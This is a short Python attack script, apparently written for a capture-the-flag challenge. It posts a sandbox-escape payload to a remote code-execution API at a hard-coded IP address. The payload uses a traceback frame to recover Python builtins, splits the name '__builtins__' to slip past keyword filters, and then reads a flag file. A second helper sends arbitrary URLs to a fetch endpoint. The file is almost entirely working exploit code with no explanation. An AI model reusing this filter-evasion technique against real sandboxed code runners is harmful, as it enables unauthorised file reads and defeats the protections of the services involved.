import requests
import json
import time

url_exec = "http://124.197.22.141:9999/api/execute"
url_fetch = "http://124.197.22.141:9999/api/fetch"

def exec_py(code):
    print(f"Executing: {code}")
    try:
        res = requests.post(url_exec, json={"code": code}, timeout=5)
        print(res.text)
    except Exception as e:
        print(f"Req Error: {e}")

def fetch_url(target_url):
    print(f"Fetching: {target_url}")
    try:
        res = requests.post(url_fetch, json={"url": target_url}, timeout=5)
        print(res.text[:200] + "..." if len(res.text) > 200 else res.text)
    except Exception as e:
        print(f"Req Error: {e}")



















# Exploit: Read HUGE Flag
payload = """
try:
    raise Exception
except Exception as e:
    b=e.__traceback__.tb_frame.f_back.f_globals['__buil'+'tins__']
    try:o=b['open']
    except:o=b.__dict__['open']
    
    f=o('flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt')
    print(f.read(512))
"""

print("\n[+] Sending Read HUGE Payload...")
exec_py(payload)





